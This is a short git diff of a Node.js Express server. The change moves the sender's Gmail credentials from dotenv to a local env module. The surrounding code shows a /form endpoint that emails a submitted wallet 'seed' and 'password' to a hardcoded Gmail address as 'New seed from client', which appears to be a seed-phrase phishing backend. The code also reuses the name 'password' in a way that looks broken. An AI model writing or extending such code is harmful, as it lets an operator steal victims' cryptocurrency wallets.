@@ -2,7 +2,7 @@ const express = require('express')
 const nodemailer = require('nodemailer')
 const path = require('path')
 const cors = require('cors')
-require('dotenv').config()
+const { user, password } = require('./env')
 
 const app = express()
 
@@ -20,8 +20,8 @@ app.post('/form', async(req, res) => {
   const transporter = await nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: process.env.USER,
-      pass: process.env.PASSWORD
+      user: user,
+      pass: password
     },
   });
  
@@ -30,7 +30,7 @@ app.post('/form', async(req, res) => {
     to: "jtom29544@gmail.com",
     subject: "New seed from client", 
     text: `seed: ${seed} \npassword: ${password ? password : ''}`
-  })  
+  })   
 
 }) 
 
